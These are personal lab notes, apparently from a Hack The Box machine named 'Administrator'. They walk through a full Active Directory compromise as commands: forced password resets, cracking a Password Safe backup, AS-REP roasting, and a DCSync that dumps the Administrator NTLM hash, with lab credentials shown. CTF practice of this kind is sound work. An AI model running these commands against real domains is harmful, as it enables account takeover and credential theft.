bloodhound-python -u Olivia -p ichliebedich -ns 10.10.11.42 -d administrator.htb -c All
![[Pasted image 20250128140853.png]]
change password for michael
bloodyAD -u "olivia" -p "ichliebedich" -d "Administrator.htb" --host "10.10.11.42" set password "Michael" "12342134"

![[Pasted image 20250128140921.png]]

bloodyAD -u "Michael" -p "12341234" -d "Administrator.htb" --host "10.10.11.42" set password "Benjamin" "12341234"

then we login into ftp and get file Backup.psafe3
pwsafe2john Backup.psafe3 > psafe.hash
john psafe.hash --wordlist=/home/kali/Downloads/rockyou.txt
password for our backupfile - tekieromucho

we found 3 credentials with member of group domain admins
![[Pasted image 20250128144315.png]]
but emily have genericwrite acl on ethan, ethan can dcsync on domain administrator.htb, so this more interesting target
![[Pasted image 20250128144442.png]]


![[Pasted image 20250128144605.png]]

*Evil-WinRM* PS C:\Users\emily\Documents> Set-DomainObject Ethan -Set @{serviceprincipalname='ops/whatever1'}

python3 GetUserSPNs.py -dc-ip 10.10.11.42 ADMINISTRATOR.HTB/emily -request-user Ethan
but its not working :( or i need to add parametr output file i dunno 

second method 
bloodyAD -u "Emily" -p "UXLCI5iETUsIBoFVTj8yQFKoHjXmb" -d "Administrator.htb" --host "10.10.11.42" add uac Ethan -f DONT_REQ_PREAUTH

python3 GetNPUsers.py ADMINISTRATOR.HTB/Emily -format hashcat -outputfile ls.txt
its work, we get password for ethan
limpbizkit

then we use DCSync atack to take ntlm hashes
python3 secretsdump.py 'ADMINISTRATOR.HTB'/Ethan:limpbizkit@10.10.11.42
Administrator:500:aad3b435b51404eeaad3b435b51404ee:3dc553ce4b9fd20bd016e098d2d2fd2e:::
